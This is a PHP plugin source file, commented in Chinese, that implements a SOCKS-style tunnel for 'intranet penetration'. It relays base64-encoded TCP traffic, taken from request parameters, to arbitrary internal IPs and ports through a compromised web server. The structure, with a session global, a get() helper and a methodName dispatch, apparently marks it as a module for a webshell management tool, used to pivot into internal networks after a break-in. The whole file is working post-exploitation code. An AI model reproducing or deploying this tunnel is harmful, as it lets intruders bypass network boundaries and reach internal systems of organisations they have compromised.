<?php
/**
 * SocksProxy.php - SOCKS 代理插件
 * 
 * 功能：实现内网穿透的 SOCKS 代理功能
 * 支持多个并发连接，通过 socketHash 标识不同的隧道
 */

/**
 * 创建隧道配置（保存目标信息到 session）
 * 注意：使用 doReadWrite 时不需要真正创建 socket，只需保存目标信息
 * @return string "ok" 或 "error:错误信息"
 */
function createTunnel() {
    global $_SES;
    
    $targetIP = get("targetIP");
    $targetPort = get("targetPort");
    $socketHash = get("socketHash");
    
    // 参数验证
    if ($targetIP == null || $targetPort == null || $socketHash == null) {
        return "error: targetIP, targetPort or socketHash is null";
    }
    
    // 初始化 socket 存储数组（如果不存在）
    if (!isset($_SES['socks_tunnels'])) {
        $_SES['socks_tunnels'] = array();
    }
    
    try {
        // 只保存目标信息到会话中（不创建真正的 socket）
        // 因为 doReadWrite 会在每次请求时创建新连接
        $_SES['socks_tunnels'][$socketHash] = array(
            'target_ip' => $targetIP,
            'target_port' => $targetPort,
            'created_at' => time()
        );
        
        return "ok";
        
    } catch (Exception $e) {
        return "error: exception - " . $e->getMessage();
    }
}

/**
 * 向指定的 socket 隧道写入数据
 * @return string "ok" 或 "error:错误信息"
 */
function doWrite() {
    global $_SES;
    
    $socketHash = get("socketHash");
    $extraData = get("extraData");
    
    // 参数验证
    if ($socketHash == null || $extraData == null) {
        return "error: socketHash or extraData is null";
    }
    
    // 检查隧道是否存在
    if (!isset($_SES['socks_tunnels']) || !isset($_SES['socks_tunnels'][$socketHash])) {
        return "error: socket connection not found for hash: {$socketHash}";
    }
    
    $tunnel = $_SES['socks_tunnels'][$socketHash];
    $socket = $tunnel['socket'];
    
    // 检查连接是否仍然有效，如果无效则尝试重新连接
    if (!is_resource($socket) || @feof($socket)) {
        // 尝试重新建立连接
        $targetIP = $tunnel['target_ip'];
        $targetPort = $tunnel['target_port'];
        
        $newSocket = @fsockopen($targetIP, intval($targetPort), $errno, $errstr, 10);
        
        if ($newSocket === false) {
            unset($_SES['socks_tunnels'][$socketHash]);
            return "error: failed to reconnect to {$targetIP}:{$targetPort}";
        }
        
        // 设置为非阻塞模式
        @stream_set_blocking($newSocket, false);
        @stream_set_timeout($newSocket, 5);
        
        // 更新 socket
        $_SES['socks_tunnels'][$socketHash]['socket'] = $newSocket;
        $socket = $newSocket;
    }
    
    try {
        // Base64 解码数据
        $data = base64_decode($extraData);
        
        if ($data === false) {
            return "error: failed to decode base64 data";
        }
        
        // 写入数据到 socket
        $written = @fwrite($socket, $data);
        
        if ($written === false) {
            return "error: failed to write data to socket";
        }
        
        // 刷新输出缓冲区
        @fflush($socket);
        
        return "ok";
        
    } catch (Exception $e) {
        return "error: exception - " . $e->getMessage();
    }
}

/**
 * 从指定的 socket 隧道读取数据
 * @return string "ok" + base64数据 或 "ok"(无数据) 或 "error:错误信息"
 */
function doRead() {
    global $_SES;
    
    $socketHash = get("socketHash");
    
    // 参数验证
    if ($socketHash == null) {
        return "error: socketHash is null";
    }
    
    // 检查隧道是否存在
    if (!isset($_SES['socks_tunnels']) || !isset($_SES['socks_tunnels'][$socketHash])) {
        return "error: Socket connection not found for hash: {$socketHash}";
    }
    
    $tunnel = $_SES['socks_tunnels'][$socketHash];
    $socket = $tunnel['socket'];
    
    // 检查连接是否仍然有效，如果无效则尝试重新连接
    if (!is_resource($socket)) {
        // 尝试重新建立连接
        $targetIP = $tunnel['target_ip'];
        $targetPort = $tunnel['target_port'];
        
        $newSocket = @fsockopen($targetIP, intval($targetPort), $errno, $errstr, 10);
        
        if ($newSocket === false) {
            unset($_SES['socks_tunnels'][$socketHash]);
            return "error: failed to reconnect to {$targetIP}:{$targetPort}";
        }
        
        // 设置为非阻塞模式
        @stream_set_blocking($newSocket, false);
        @stream_set_timeout($newSocket, 5);
        
        // 更新 socket
        $_SES['socks_tunnels'][$socketHash]['socket'] = $newSocket;
        $socket = $newSocket;
    }
    
    // 检查连接是否已关闭
    if (@feof($socket)) {
        unset($_SES['socks_tunnels'][$socketHash]);
        return "error: socketChanel closed by peer";
    }
    
    try {
        // 读取数据（非阻塞模式）
        // 尝试读取最多 8KB 的数据
        $data = @fread($socket, 8192);
        
        if ($data === false) {
            // 读取失败
            return "error: failed to read from socket";
        }
        
        if (strlen($data) == 0) {
            // 没有数据可读，但连接正常
            return "ok";
        }
        
        // 有数据，Base64 编码后返回
        $encodedData = base64_encode($data);
        return "ok" . $encodedData;
        
    } catch (Exception $e) {
        return "error: exception - " . $e->getMessage();
    }
}

/**
 * 在同一个请求中完成写入和读取操作（关键方法！）
 * 这解决了 PHP 无法在不同请求之间保持 socket 连接的问题
 * @return string "ok" + base64数据 或 "ok"(无数据) 或 "error:错误信息"
 */
function doReadWrite() {
    global $_SES;
    
    $socketHash = get("socketHash");
    $extraData = get("extraData");
    
    // 参数验证
    if ($socketHash == null) {
        return "error: socketHash is null";
    }
    
    // 检查隧道是否存在
    if (!isset($_SES['socks_tunnels']) || !isset($_SES['socks_tunnels'][$socketHash])) {
        return "error: socket connection not found for hash: {$socketHash}";
    }
    
    $tunnel = $_SES['socks_tunnels'][$socketHash];
    $targetIP = $tunnel['target_ip'];
    $targetPort = $tunnel['target_port'];
    
    try {
        // 创建新的 TCP 连接
        $socket = @fsockopen($targetIP, intval($targetPort), $errno, $errstr, 10);
        
        if ($socket === false) {
            return "error: failed to connect to {$targetIP}:{$targetPort}, errno={$errno}";
        }
        
        // 设置为阻塞模式（重要！确保写入和读取都能完成）
        @stream_set_blocking($socket, true);
        @stream_set_timeout($socket, 10);
        
        // 步骤1: 如果有数据需要写入，先写入
        if ($extraData != null && strlen($extraData) > 0) {
            $data = base64_decode($extraData);
            
            if ($data === false) {
                @fclose($socket);
                return "error: failed to decode base64 data";
            }
            
            // 写入数据
            $written = @fwrite($socket, $data);
            
            if ($written === false) {
                @fclose($socket);
                return "error: failed to write data to socket";
            }
            
            // 刷新输出缓冲区
            @fflush($socket);
        }
        
        // 步骤2: 读取响应数据
        // 等待一小段时间让服务器处理请求
        usleep(50000); // 50ms
        
        // 设置为非阻塞模式读取
        @stream_set_blocking($socket, false);
        
        $responseData = "";
        $maxAttempts = 10; // 最多尝试10次
        $attempt = 0;
        
        while ($attempt < $maxAttempts) {
            $chunk = @fread($socket, 8192);
            
            if ($chunk === false) {
                break;
            }
            
            if (strlen($chunk) > 0) {
                $responseData .= $chunk;
                $attempt = 0; // 重置计数器，因为还有数据
            } else {
                $attempt++;
                usleep(20000); // 等待20ms
            }
            
            // 检查连接是否关闭
            if (@feof($socket)) {
                break;
            }
        }
        
        // 关闭连接
        @fclose($socket);
        
        // 返回结果
        if (strlen($responseData) > 0) {
            $encodedData = base64_encode($responseData);
            return "ok" . $encodedData;
        } else {
            return "ok";
        }
        
    } catch (Exception $e) {
        if (isset($socket) && is_resource($socket)) {
            @fclose($socket);
        }
        return "error: exception - " . $e->getMessage();
    }
}

/**
 * 清理所有隧道配置信息
 * @return string "ok" 或 "error:错误信息"
 */
function doClear() {
    global $_SES;
    
    try {
        if (!isset($_SES['socks_tunnels'])) {
            return "ok";
        }
        
        // 清空隧道配置数组
        // 注意：使用 doReadWrite 时，每个连接都是独立的，无需关闭 socket
        $_SES['socks_tunnels'] = array();
        
        return "ok";
        
    } catch (Exception $e) {
        return "error: exception - " . $e->getMessage();
    }
}

// ====== 插件入口 - 方法调度 ======

$methodName = get("methodName");

if ($methodName == null) {
    return "error: methodName is null";
}

// 根据方法名调用相应的函数
if ($methodName == "createTunnel") {
    return createTunnel();
} else if ($methodName == "doWrite") {
    return doWrite();
} else if ($methodName == "doRead") {
    return doRead();
} else if ($methodName == "doReadWrite") {
    return doReadWrite();
} else if ($methodName == "doClear") {
    return doClear();
} else {
    return "error: method '{$methodName}' not found";
}

